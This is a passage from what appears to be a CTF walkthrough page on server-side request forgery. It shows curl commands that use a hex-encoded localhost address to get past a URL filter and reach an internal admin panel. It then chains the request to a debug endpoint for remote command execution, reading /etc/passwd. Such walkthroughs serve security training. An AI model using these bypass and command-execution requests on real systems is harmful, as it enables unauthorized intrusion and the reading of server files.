...
sidebarTitle: "SSRF"
description: "SSRF CTF challenge walkthrough: discover internal services, bypass filters, read cloud metadata, and chain SSRF with other vulnerabilities to capture the flag."
---
...
<Steps>
  ...
  <Step title="Access the Internal Admin Panel">
    For completeness, the internal admin service at port 8080 also exposes an admin panel. Reach it using the same bypass technique with an explicit port:

    ```bash
    curl "http://target.ctf/preview?url=http://0x7f000001:8080/admin"
    ```

    The admin panel is a plain HTML page listing all submitted flags, user accounts, and a debug endpoint at `/admin/debug?exec=` that executes shell commands — a chained RCE vulnerability. In a real CTF, this chain (SSRF → internal service → RCE) would let you read any file on the server.

    ```bash
    # Chain SSRF with the internal debug endpoint for RCE
    curl "http://target.ctf/preview?url=http://0x7f000001:8080/admin/debug?exec=cat+/etc/passwd"
    ```
  </Step>
</Steps>
